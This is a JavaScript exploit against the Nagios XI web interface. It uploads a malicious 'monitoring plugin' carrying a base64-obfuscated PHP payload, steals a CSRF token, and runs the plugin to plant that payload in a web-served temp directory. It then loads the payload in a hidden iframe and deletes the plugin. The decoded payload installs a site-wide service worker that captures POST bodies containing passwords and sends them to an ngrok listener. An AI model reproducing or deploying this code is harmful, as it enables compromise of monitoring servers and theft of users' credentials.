// This file is generated by the package-sw-payload.sh script, refer to it for instructions

var plugin_name = 'check_sw.sh';
var nsp = window.nsp_str || window.top.nsp_str; // we might be inside the iframe
// base64 value is the encoded contents of install-sw.php
var plugin_payload = `
#!/bin/sh

echo 'PD9waHAKaWYgKCRfR0VUWydzdyddID09ICJ0cnVlIikgewogIGhlYWRlcignU2VydmljZS1Xb3JrZXItQWxsb3dlZDogLycpOwogIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qYXZhc2NyaXB0Jyk7Cj8+Ci8vIGNvbnRlbnRzIG9mIHN3LmpzCnZhciBsaXN0ZW5lclVybCA9ICdodHRwczovLzViYmQ2MjY4NTZhOC5uZ3Jvay5pbyc7CgpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoJ2luc3RhbGwnLCBmdW5jdGlvbihldmVudCkgewogIGNvbnNvbGUuZGVidWcoImluc3RhbGwiKTsKfSk7CgpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoJ2FjdGl2YXRlJywgZnVuY3Rpb24oZXZlbnQpIHsKICBjb25zb2xlLmRlYnVnKCJhY3RpdmF0ZSIpOwp9KTsKCnNlbGYuYWRkRXZlbnRMaXN0ZW5lcignZmV0Y2gnLCBldmVudCA9PiB7CiAgZXZlbnQucmVzcG9uZFdpdGgoYXN5bmMgZnVuY3Rpb24oKSB7CiAgICB2YXIgY2xvbmUgPSBldmVudC5yZXF1ZXN0LmNsb25lKCk7CgogICAgLy8gUmV3cml0ZSB0aGlzIGlmIHlvdSB3YW50IHRvIGNhcHR1cmUgb3RoZXIgcmVxdWVzdHMKICAgIGlmIChldmVudC5yZXF1ZXN0Lm1ldGhvZCA9PT0gJ1BPU1QnKSB7CiAgICAgIGNsb25lLnRleHQoKS50aGVuKGZ1bmN0aW9uKHQpIHsKICAgICAgICBpZiAodC5pbmNsdWRlcygicGFzc3dvcmQiKSkgewogICAgICAgICAgZmV0Y2gobGlzdGVuZXJVcmwgKyAiL2I2NC8iICsgYnRvYSh0KSk7CiAgICAgICAgfQogICAgICB9KTsKICAgIH0KCiAgICByZXR1cm4gZmV0Y2goZXZlbnQucmVxdWVzdCk7CiAgfSgpKTsKfSk7Cjw/cGhwIH0gZWxzZSB7ID8+CjxzY3JpcHQ+CiAgd2luZG93Lm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgaWYgKCdzZXJ2aWNlV29ya2VyJyBpbiBuYXZpZ2F0b3IpIHsKICAgICAgbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoJy9uYWdpb3N4aS9pbmNsdWRlcy9jb21wb25lbnRzL2hpZ2hjaGFydHMvZXhwb3J0aW5nLXNlcnZlci90ZW1wL2luc3RhbGwtc3cucGhwP3N3PXRydWUnLCB7IHNjb3BlOiAnLycgfSkKICAgICAgLnRoZW4oZnVuY3Rpb24ocmVnaXN0cmF0aW9uKSB7CiAgICAgICAgY29uc29sZS5kZWJ1ZygnUmVnaXN0cmF0aW9uIHN1Y2Nlc3NmdWwsIHNjb3BlIGlzOicsIHJlZ2lzdHJhdGlvbi5zY29wZSk7CiAgICAgIH0pCiAgICAgIC5jYXRjaChmdW5jdGlvbihlcnJvcikgewogICAgICAgIGNvbnNvbGUuZGVidWcoJ1NlcnZpY2Ugd29ya2VyIHJlZ2lzdHJhdGlvbiBmYWlsZWQsIGVycm9yOicsIGVycm9yKTsKICAgICAgfSk7CiAgICB9CiAgfTsKPC9zY3JpcHQ+Cjw/cGhwIH0gPz4K' | base64 -d > /usr/local/nagiosxi/html/includes/components/highcharts/exporting-server/temp/install-sw.php

`;

// Upload plugin with the above payload
var fd = new FormData();
fd.append('upload', 1);
fd.append('nsp', nsp); 
fd.append('uploadedfile', new Blob([plugin_payload]), plugin_name);
fetch('/nagiosxi/admin/monitoringplugins.php', { method: 'POST', body: fd })
  .then(function() {
    // Now we need to grab the CSRF token
    return fetch('/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=command');
  })
  .then(function(res) {
    return res.text();
  })
  .then(function(page) {
    // Extract token
    var found = page.match(/token" type="hidden" value="(\w+)"/);
    // Run plugin code creating install-sw.php
    return fetch(`/nagiosxi/includes/components/ccm/command_test.php?cmd=help&mode=help&plugin=${plugin_name}&token=${found[1]}`);
  })
  .then(function() {
    // install sw in a hidden iframe now that we've added install-sw.php in a directory it will execute
    var fragment = document.createDocumentFragment();
    var iframe = document.createElement('iframe');
    iframe.setAttribute("src", "/nagiosxi/includes/components/highcharts/exporting-server/temp/install-sw.php");
    iframe.setAttribute("style", "display: none");
    fragment.appendChild(iframe);
    document.body.appendChild(fragment);
    // remove plugin
    return fetch(`/nagiosxi/admin/monitoringplugins.php?delete=${plugin_name}&nsp=${nsp}`);
  });